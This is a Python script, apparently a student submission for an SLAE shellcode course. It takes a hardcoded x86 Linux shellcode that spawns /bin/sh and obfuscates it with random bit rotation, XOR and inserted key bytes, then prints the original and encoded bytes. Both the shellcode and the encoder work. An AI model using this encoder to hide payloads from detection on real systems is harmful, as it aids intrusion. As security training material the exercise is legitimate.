#coding:utf-8
"""
Filename:      encoder.py
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          Python3 Encoder: Byte insertion + Random number of bits rotation + XOR

"""

import random;

def mask(n):
   """Return a bitmask of length n (suitable for masking against an
      int to coerce the size to a given length)
   """
   if n >= 0:
       return 2**n - 1
   else:
       return 0

def rol(n, rotations, width=8):
    """Return a given number of bitwise left rotations of an integer n,
       for a given bit field width.
    """
    rotations %= width
    if rotations < 1:
        return n
    n &= mask(width) ## Should it be an error to truncate here?
    return ((n << rotations) & mask(width)) | (n >> (width - rotations))

def ror(n, rotations, width=8):
    """Return a given number of bitwise right rotations of an integer n,
       for a given bit field width.
    """
    rotations %= width
    if rotations < 1:
        return n
    n &= mask(width)
    return (n >> rotations) | ((n << (width - rotations)) & mask(width))

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

decoded = ""
decoded2 = ""
encoded = ""
encoded2 = ""

for x in bytearray(shellcode):
    decoded += '\\x'
    decoded += '%02x' % x
    decoded2 += '0x'
    decoded2 += '%02x,' % x

for x in bytearray(shellcode):
    rand = random.randint(1,8)
    x = rol(x,rand)                 # random (1-8) bit rotation to left
    x = x^rand                      # XOR with random number (1-8)
    encoded += '\\x'
    encoded += '%02x' % x
    encoded += '\\x%02x' % rand

    encoded2 += '0x'
    encoded2 += '%02x,' % x
    encoded2 += '0x%02x,' % rand

print("-" * 90)
print("Decoded shellcode:")
print("-" * 90)
print(decoded)
print("-" * 90)
print(decoded2[:-1])
print("-" * 90)
print("Encoded shellcode:")
print("-" * 90)
print(encoded)
print("-" * 90)
print(encoded2[:-1])
print("-" * 90)

print("Shellcode Length:", len(bytearray(shellcode)))
